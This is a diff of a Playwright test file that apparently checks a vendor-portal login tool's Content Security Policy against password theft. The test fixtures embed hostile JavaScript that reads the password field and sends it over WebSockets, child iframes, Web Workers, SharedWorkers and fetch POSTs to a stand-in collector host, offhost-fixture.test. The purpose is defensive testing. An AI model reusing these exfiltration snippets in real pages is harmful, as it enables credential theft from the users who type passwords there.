@@ -3,7 +3,7 @@
 import fs from "node:fs/promises";
 import os from "node:os";
 import path from "node:path";
-import { chromium, type Browser, type BrowserContext, type Request } from "playwright";
+import { chromium, type Browser, type BrowserContext, type Request, type Route } from "playwright";
 import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest";
 import {
   PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS,
@@ -26,7 +26,7 @@ const USERNAME = "fixture-user@example.test";
 const PASSWORD = "fixture-vendor-password-SENTINEL";
 const WRONG_PASSWORD = "fixture-wrong-password-SENTINEL";
 
-type Served = { status?: number; contentType?: string; body: string };
+type Served = { status?: number; contentType?: string; headers?: Record<string, string>; body: string };
 type Site = Record<string, Served | ((request: Request) => Served)>;
 type Observed = { requests: string[]; posts: Array<{ target: string; body: string }>; sockets: string[] };
 
@@ -251,27 +251,46 @@ function borrowedBrowser(): Browser {
 async function serve(context: BrowserContext, site: Site, observed: Observed) {
   // Third-party CAPTCHA state that must never reach a saved session.
   await context.addCookies([{ name: "NID", value: "fixture-third-party", domain: ".google.com", path: "/", secure: true, sameSite: "None" }]);
-  await context.route("**/*", async (route) => {
-    const request = route.request();
+  const responseFor = (request: Request): Served => {
     const url = new URL(request.url());
     const key = `${request.method()} ${url.host}${url.pathname}`;
     observed.requests.push(key);
     if (request.method() === "POST") observed.posts.push({ target: `${url.host}${url.pathname}`, body: request.postData() ?? "" });
     const entry = site[key];
-    if (!entry) {
-      await route.fulfill({ status: 404, body: "" });
-      return;
-    }
-    const response = typeof entry === "function" ? entry(request) : entry;
-    await route.fulfill({ status: response.status ?? 200, contentType: response.contentType ?? "text/html", body: response.body });
+    return !entry ? { status: 404, body: "" } : typeof entry === "function" ? entry(request) : entry;
+  };
+  await context.route("**/*", async (route) => {
+    const response = responseFor(route.request());
+    await route.fulfill({ ...response, status: response.status ?? 200, contentType: response.contentType ?? "text/html" });
   });
-  // A stand-in socket server for every host: it records each connection and message it receives.
-  await context.routeWebSocket("**/*", (socket) => {
-    observed.sockets.push(`open ${socket.url()}`);
-    socket.onMessage((message) => {
-      observed.sockets.push(`message ${socket.url()} ${String(message)}`);
-    });
-  });
+  // Supply synthetic HTTP responses to the production document fetch too.
+  // The production handler still installs the CSP and Chromium enforces it.
+  const registerRoute = context.route.bind(context);
+  context.route = ((url, handler, options) => registerRoute(url, (route, request) => handler(new Proxy(route, {
+    get(target, property) {
+      if (property === "fetch") return async () => {
+        const response = responseFor(request);
+        return {
+          status: () => response.status ?? 200,
+          headers: () => ({ "content-type": response.contentType ?? "text/html", ...response.headers }),
+          body: async () => Buffer.from(response.body),
+          dispose: async () => undefined,
+        };
+      };
+      const value = Reflect.get(target, property);
+      return typeof value === "function" ? value.bind(target) : value;
+    },
+  }) as Route, request), options)) as BrowserContext["route"];
+  // CDP observes native connection attempts independently of routeWebSocket
+  // handler precedence. DNS is disabled, so even an allow-all mutation is local.
+  const newPage = context.newPage.bind(context);
+  context.newPage = async () => {
+    const page = await newPage();
+    const session = await context.newCDPSession(page);
+    await session.send("Network.enable");
+    session.on("Network.webSocketCreated", ({ url }) => observed.sockets.push(url));
+    return page;
+  };
 }
 
 const authenticatedEvidence = (vendor: UnattendedLoginVendor): SessionProbeEvidence => ({
@@ -279,7 +298,7 @@ const authenticatedEvidence = (vendor: UnattendedLoginVendor): SessionProbeEvide
   finalHost: null, httpStatus: 200, navigations: 1, blockedRequests: 0,
 });
 
-async function runLogin(vendor: UnattendedLoginVendor, site: Site, password = PASSWORD) {
+async function runLogin(vendor: UnattendedLoginVendor, site: Site, password = PASSWORD, allowAllSockets = false) {
   stateDir = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "ovd-vendor-login-browser-")));
   const observed: Observed = { requests: [], posts: [], sockets: [] };
   const lines: string[] = [];
@@ -298,7 +317,13 @@ async function runLogin(vendor: UnattendedLoginVendor, site: Site, password = PA
       close: async () => undefined,
     },
     launchBrowser: async () => borrowedBrowser(),
-    prepareContext: (context) => serve(context, site, observed),
+    prepareContext: async (context) => {
+      await serve(context, site, observed);
+      if (allowAllSockets) {
+        const register = context.routeWebSocket.bind(context);
+        context.routeWebSocket = (url) => register(url, (socket) => { socket.connectToServer(); });
+      }
+    },
     // The GET-only probe launches its own browser against the network, so it is stubbed here;
     // vendorSession.browser.test.ts runs it against a loopback server.
     sessionDeps: {
@@ -440,18 +465,62 @@ describe("login:vendors against synthetic portals", () => {
     expect(observed.requests.some((request) => request.includes("offhost-fixture.test"))).toBe(false);
   }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
 
-  it("refuses WebSockets to unreviewed origins from the page and from a child frame", async () => {
+  it.each([false, true])("observes native WebSocket attempts independently (allow-all mutation: %s)", async (allowAll) => {
     const exfiltrate = `const typed = new FormData(login).get("password");
       const send = (url) => { try { const socket = new WebSocket(url); socket.onopen = () => socket.send(typed); } catch {} };
       send("wss://collector.offhost-fixture.test/s");
       send("wss://unreviewed.quickparts.com/s");
+      send("wss://quickquote.quickparts.com/control");
       const sink = document.createElement("iframe");
       sink.srcdoc = "<script>const s = new WebSocket('wss://collector.offhost-fixture.test/frame'); s.onopen = () => s.send(parent.document.querySelector('[name=password]').value);<\\/script>";
       document.body.appendChild(sink);
       await new Promise((resolve) => setTimeout(resolve, 500));`;
-    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ onSubmit: exfiltrate })));
+    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ onSubmit: exfiltrate })), PASSWORD, allowAll);
     expect(result.outcome).toBe("saved");
+    const refused = ["wss://collector.offhost-fixture.test/s", "wss://unreviewed.quickparts.com/s", "wss://collector.offhost-fixture.test/frame"];
+    expect(observed.sockets.sort()).toEqual(["wss://quickquote.quickparts.com/control", ...(allowAll ? refused : [])].sort());
+  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
+
+  it("refuses worker execution and egress in the page and a fresh child realm", async () => {
+    const attemptWorkers = `
+      const ran = [];
+      const violations = [];
+      const child = document.createElement('iframe');
+      document.body.appendChild(child);
+      for (const realm of [window, child.contentWindow]) {
+        realm.document.addEventListener('securitypolicyviolation', (event) => violations.push(event.effectiveDirective));
+        const code = "const send = (password) => { const s = new WebSocket('wss://collector.offhost-fixture.test/worker'); s.onopen = () => s.send(password); fetch('https://collector.offhost-fixture.test/c', {method:'POST', body:password}).catch(() => {}); }; onmessage = (e) => { postMessage('ran'); send(e.data); }; onconnect = (e) => { e.ports[0].onmessage = (m) => { e.ports[0].postMessage('ran'); send(m.data); }; e.ports[0].start(); };";
+        for (const kind of ['Worker', 'SharedWorker']) {
+          for (const url of [URL.createObjectURL(new Blob([code], {type: 'text/javascript'})), 'data:text/javascript,' + encodeURIComponent(code)]) {
+            try {
+              const worker = new realm[kind](url);
+              const port = worker.port || worker;
+              port.onmessage = () => ran.push(kind);
+              if (worker.port) port.start();
+              port.postMessage(new FormData(login).get('password'));
+            } catch {}
+          }
+        }
+      }
+      let serviceRegistered = false;
+      // Exercise native registration under CSP, beyond Playwright's instance stub.
+      await ServiceWorkerContainer.prototype.register.call(navigator.serviceWorker, '/fixture-worker.js')
+        .then(() => { serviceRegistered = true; }, () => {});
+      await new Promise((resolve) => setTimeout(resolve, 500));
+      await fetch('/worker-results', {method: 'POST', body: JSON.stringify({ran, violations, serviceRegistered})});`;
+    const site = quickpartsSite(quickpartsApp({ onSubmit: attemptWorkers }));
+    site["POST quickquote.quickparts.com/worker-results"] = json(200, {});
+    site["GET quickquote.quickparts.com/fixture-worker.js"] = { contentType: "text/javascript", body: "self.addEventListener('install', () => self.skipWaiting());" };
+    const { result, observed } = await runLogin("quickparts", site);
+    expect(result.outcome).toBe("saved");
+    const report = observed.posts.find((post) => post.target.endsWith("/worker-results"));
+    expect(report).toBeDefined();
+    const evidence = JSON.parse(report!.body);
+    expect(evidence.ran).toEqual([]);
+    expect(evidence.serviceRegistered).toBe(false);
+    expect(evidence.violations).toContain("worker-src");
     expect(observed.sockets).toEqual([]);
+    expect(observed.requests.some((request) => request.includes("offhost-fixture.test"))).toBe(false);
   }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
 
   it("aborts a sign-in form that targets a popup or an iframe on another host", async () => {
